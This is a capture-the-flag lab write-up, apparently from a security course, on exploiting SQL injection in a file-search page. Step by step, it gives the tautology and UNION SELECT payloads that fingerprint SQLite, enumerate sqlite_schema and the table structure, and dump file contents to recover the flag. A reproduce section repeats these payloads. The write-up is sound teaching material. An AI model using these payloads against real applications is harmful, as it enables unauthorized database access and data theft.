## On the page "<http://sqli4.chal.deti:8033/>"

It is shown a search bar that lets me search for files.
Then when searched by the name it shows the file name, size and matches

## Method

- On the page i first searched for normal itens to get an idea of how the system works
- It searches by the file name (or parts of it) and then returns the files that matched the search, their name, their size and how many files matched
- To check if an injection is possible I tried

```
abc' OR 1=1 --
```

- It returned every item (i presume) in the db, so the injection works on that camp
- Then I went on to try a Union Based injection to test the gathering of information
- I assumed it had 3 columns because the columns should match what is returned (name, size, howManyReturned)

```
abc' UNION SELECT 1,2,3 --
```

- This made the site display a "file" with the name 2, size 3B and that returned 1 match
- By trying to add '"' in the injection I knew that the columns types are Integer, String, Integer
  - While trying this i figured that the first number of the injection can be a String and that it doesnt influence the output on gathering

  ```
  abc' UNION SELECT "10",2,3 --
  ```

  This returns the same as

  ```
  abc' UNION SELECT 1,2,3 --
  ```

  - But by doing

  ```
  abc' UNION SELECT 1,"teste",3 --
  ```

  The "file" name becomes "teste"

  - And by doing

  ```
  abc' UNION SELECT 1,"teste","3" --
  ```

  The sites returns 500

  - I conclude that the first input of the UNION i dont know what is, but doesnt matter, the second is the file name (can be either a string or a number) and the third is the size of the file (has to be a number, probably an integer since it is measured in bytes)

- Now the next step is to try to get the tables that define the db to get information about it

```
abc' UNION SELECT 1,"teste",3 FROM sqlite_schema --
```

This didnt give an error and return our placeholder information, so this DB is sqlite

- Now i want to get the tables

```
abc' UNION SELECT 1,name,3 FROM sqlite_schema --
```

This gave me 2 tables, "files" and sqlite_auto_index_files_1 (this must be some type of index)

- To confirm that the sqlite_auto_index_files_1 is not a table i ran

```
abc' UNION SELECT 1,name,3 FROM sqlite_schema WHERE type="table" --
```

It returned just the files table

- Now I know the name of the table, i want to know the columns names now

```
abc' UNION SELECT 1,sql,3 FROM sqlite_schema WHERE type="table" --
```

This returned in the file name

```
CREATE TABLE files ( id INTEGER PRIMARY KEY, name TEXT NOT NULL UNIQUE, size INTEGER NOT NULL, content TEXT NOT NULL )
```

This shows me that files has an ID, name, size and content columns

- I want to get everysingle thing in content, there probably is there the interesting stuff

```
abc' UNION SELECT 1,content,3 FROM files --
```

This returned the files content

```
File Size
Docx draft contract, redlines inline 3 B
Docx notes from the planning meeting 3 B
MP4 walkthrough of the new site 3 B
PDF invoice, net 30, office supplies 3 B
PK zip archive of the offsite photos 3 B
flag{24546cb4b0722640ab4639fa45a18f4f} 3 B
```

- As you can see, the flag was found

## Reproduce

- Go to the page "<http://sqli4.chal.deti:8033/>"
- On the search bar insert

```
"abc' UNION SELECT 1,name,3 FROM sqlite_schema WHERE type="table" -- "
```

and search to get the tables in the DB

- On the search bar insert

```
abc' UNION SELECT 1,sql,3 FROM sqlite_schema WHERE type="table" --
```

and search to get the columns of the files table

- On the search bar insert

```
abc' UNION SELECT 1,content,3 FROM files --
```

and search to get the contents from all the files, the flag should be there
